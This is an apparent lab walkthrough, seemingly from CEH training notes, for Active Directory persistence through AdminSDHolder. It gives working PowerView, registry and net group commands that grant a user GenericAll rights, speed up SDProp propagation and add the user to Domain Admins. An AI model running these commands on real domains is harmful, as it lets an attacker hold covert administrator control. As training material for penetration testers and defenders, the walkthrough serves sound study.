# Exploiting Active Directory Objects

**AdminSDHolder** is an Active Directory container with the default security permissions, it is used as a template for AD accounts and groups, such as Domain Admins, Enterprise Admin, etc. to protect them from unintentional modification of permissions.

If a user account is added into the access control list of **AdminSDHolder**, the user will acquire “**GenericAll**” permissions which is equivalent to domain administrators.

1. create the payload and upload to target then set up the listener
2. upload **PowerTools-Master** folder to the target system.

{% embed url="https://github.com/PowerShellEmpire/PowerTools?tab=readme-ov-file" %}

3. Access the target shell, then go to `C:\WIndows\System32` , type `powershell`&#x20;

As we have access to PowerShell access with admin privileges, we can add a standard user Martin in the CEH domain to the AdminSDHolder directory and from there to the Domain Admins group, to maintain persistence in the domain.

4. Navigate to `C:\Users\Administrator\Downloads\PowerView`where the folder we upload before, type `Import-Module ./powerview.psm1`&#x20;
5. To add user named **Martin** to ACL, type `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All`&#x20;
6. To check the permissions assigned to **Martin**, type: `Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs`&#x20;

We can see that user Martin now has GenericAll active directory rights. Normally that changes in ACL will propagate automatically after 60 minutes, we can enter the following command to reduce the time interval of SDProp to 3 minutes.

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
```

> (Microsoft doesn’t recommend the modification of this setting, as this might cause performance issues in relation to LSASS process across the domain.)

7. Add user **Martin** to **Domain Admins** group as he is already having all the permissions. `net group "Domain Admins" Martin /add /domain`&#x20;
8. To verify it, log as **Martin** and in cmd try access `dir \\[ip domain]\C$` will list the C:/ Drive.

We can see that the Domain Controller is now accessible to Martin and thus domain persistence has been established. Can also use the additional commands in the table below to extract sensitive information such as users, groups, domains, and other resources from the target AD environment.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
